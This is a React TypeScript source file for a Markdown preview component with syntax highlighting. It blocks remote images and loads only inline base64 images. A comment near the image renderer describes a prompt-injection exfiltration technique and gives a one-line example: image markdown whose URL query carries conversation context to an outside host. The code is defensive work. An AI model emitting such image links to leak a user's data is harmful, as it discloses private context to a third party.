import { Box, Code, Link, Table, Text } from "@chakra-ui/react";
import { memo } from "react";
import { LuImage } from "react-icons/lu";
import ReactMarkdown, { type Components, defaultUrlTransform } from "react-markdown";
import remarkGfm from "remark-gfm";

import { highlightLines } from "../../lib/highlight";

/** Token colours for `tok-*` classes (light / dark), close to VS Code's default themes. */
const TOKEN_CSS = {
  "& .tok-keyword, & .tok-controlKeyword, & .tok-definitionKeyword, & .tok-moduleKeyword": {
    color: "purple.600",
    _dark: { color: "purple.300" },
  },
  "& .tok-string, & .tok-string2": { color: "green.700", _dark: { color: "green.300" } },
  "& .tok-comment, & .tok-lineComment, & .tok-blockComment": {
    color: "fg.muted",
    fontStyle: "italic",
  },
  "& .tok-number, & .tok-bool, & .tok-atom": { color: "orange.600", _dark: { color: "orange.300" } },
  "& .tok-variableName.tok-definition, & .tok-function": { color: "blue.600", _dark: { color: "blue.300" } },
  "& .tok-typeName, & .tok-className": { color: "teal.600", _dark: { color: "teal.300" } },
  "& .tok-propertyName": { color: "cyan.700", _dark: { color: "cyan.300" } },
  "& .tok-operator, & .tok-punctuation": { color: "fg.muted" },
} as const;

/** Highlighted code block (python/sql/yaml/json; others as plain text). */
export function CodeBlock({ code, language }: { code: string; language?: string | undefined }) {
  const lines = highlightLines(code.replace(/\n$/, ""), language);
  return (
    <Box
      as="pre"
      fontFamily="mono"
      fontSize="xs"
      lineHeight="1.55"
      bg="bg.muted"
      borderWidth="1px"
      rounded="md"
      px={3}
      py={2}
      my={2}
      overflowX="auto"
      css={TOKEN_CSS}
      data-language={language}
    >
      <code>
        {lines.map((tokens, i) => (
          <span key={i}>
            {tokens.map((t, j) =>
              t.cls ? (
                <span key={j} className={t.cls}>
                  {t.text}
                </span>
              ) : (
                t.text
              ),
            )}
            {i < lines.length - 1 ? "\n" : null}
          </span>
        ))}
      </code>
    </Box>
  );
}

/** Inline raster images the page may show: they carry their bytes, so nothing is fetched. */
const INLINE_IMAGE = /^data:image\/(?:png|jpeg|gif|webp);base64,[a-z0-9+/=\s]+$/i;

export function isInlineImage(src: string | undefined): boolean {
  return !!src && INLINE_IMAGE.test(src);
}

/** react-markdown's sanitiser, plus inline raster `data:` images for `src`. */
function urlTransform(url: string, key: string): string {
  if (key === "src" && isInlineImage(url)) return url;
  return defaultUrlTransform(url);
}

const linkProps = {
  color: "blue.600",
  _dark: { color: "blue.300" },
  target: "_blank",
  rel: "noopener noreferrer",
} as const;

const components: Components = {
  h1: ({ children }) => (
    <Text as="h1" fontSize="lg" fontWeight="bold" mt={3} mb={1.5}>
      {children}
    </Text>
  ),
  h2: ({ children }) => (
    <Text as="h2" fontSize="md" fontWeight="bold" mt={3} mb={1} pb={0.5} borderBottomWidth="1px">
      {children}
    </Text>
  ),
  h3: ({ children }) => (
    <Text as="h3" fontSize="sm" fontWeight="bold" mt={2.5} mb={1}>
      {children}
    </Text>
  ),
  h4: ({ children }) => (
    <Text as="h4" fontSize="sm" fontWeight="semibold" mt={2} mb={1}>
      {children}
    </Text>
  ),
  p: ({ children }) => (
    <Text fontSize="sm" my={1.5} lineHeight="1.6">
      {children}
    </Text>
  ),
  a: ({ children, href }) => (
    <Link href={href} {...linkProps}>
      {children}
    </Link>
  ),
  // Markdown here is often model output or fetched documentation: loading a remote image
  // would send a request the reader never chose (prompt-injected `![](https://x/?q=<context>)`
  // exfiltrates data through the URL). Remote images are shown as links instead.
  img: ({ src, alt }) => {
    const url = typeof src === "string" ? src : undefined;
    if (isInlineImage(url)) return <img src={url} alt={alt ?? ""} style={{ maxWidth: "100%" }} />;
    const label = alt?.trim() || url || "";
    if (!url) return <>{label}</>;
    return (
      <Link href={url} {...linkProps} data-testid="markdown-image-link" title={url}>
        <LuImage style={{ display: "inline", verticalAlign: "-0.125em", marginInlineEnd: "0.25em" }} aria-hidden />
        {label}
      </Link>
    );
  },
  ul: ({ children }) => (
    <Box as="ul" ps={5} my={1.5} fontSize="sm" listStyleType="disc">
      {children}
    </Box>
  ),
  ol: ({ children }) => (
    <Box as="ol" ps={5} my={1.5} fontSize="sm" listStyleType="decimal">
      {children}
    </Box>
  ),
  li: ({ children }) => (
    <Box as="li" my={0.5} lineHeight="1.6">
      {children}
    </Box>
  ),
  blockquote: ({ children }) => (
    <Box as="blockquote" borderStartWidth="3px" borderColor="border.emphasized" ps={3} my={2} color="fg.muted">
      {children}
    </Box>
  ),
  hr: () => <Box as="hr" my={3} borderColor="border" />,
  table: ({ children }) => (
    <Box overflowX="auto" my={2}>
      <Table.Root size="sm" variant="outline">
        {children}
      </Table.Root>
    </Box>
  ),
  thead: ({ children }) => <Table.Header>{children}</Table.Header>,
  tbody: ({ children }) => <Table.Body>{children}</Table.Body>,
  tr: ({ children }) => <Table.Row>{children}</Table.Row>,
  th: ({ children }) => <Table.ColumnHeader fontSize="xs">{children}</Table.ColumnHeader>,
  td: ({ children }) => <Table.Cell fontSize="xs">{children}</Table.Cell>,
  pre: ({ children }) => <>{children}</>,
  code: ({ className, children }) => {
    const text = String(children ?? "");
    const lang = /language-([\w+-]+)/.exec(className ?? "")?.[1];
    // Fenced blocks have a language class or span several lines; the rest is inline code.
    if (lang || text.includes("\n")) return <CodeBlock code={text} language={lang} />;
    return (
      <Code fontSize="0.85em" px={1} py={0} variant="subtle">
        {children}
      </Code>
    );
  },
};

/**
 * GitHub-flavoured Markdown, rendered without raw HTML (react-markdown escapes it and
 * sanitises link URLs), so user-written docs are safe to preview. Remote images are never
 * loaded (they become links), so model output cannot make the browser call a URL.
 */
export const Markdown = memo(function Markdown({ text }: { text: string }) {
  return (
    <Box className="autoair-markdown" fontSize="sm" wordBreak="break-word" data-testid="markdown-preview">
      <ReactMarkdown remarkPlugins={[remarkGfm]} components={components} urlTransform={urlTransform}>
        {text}
      </ReactMarkdown>
    </Box>
  );
});

export default Markdown;
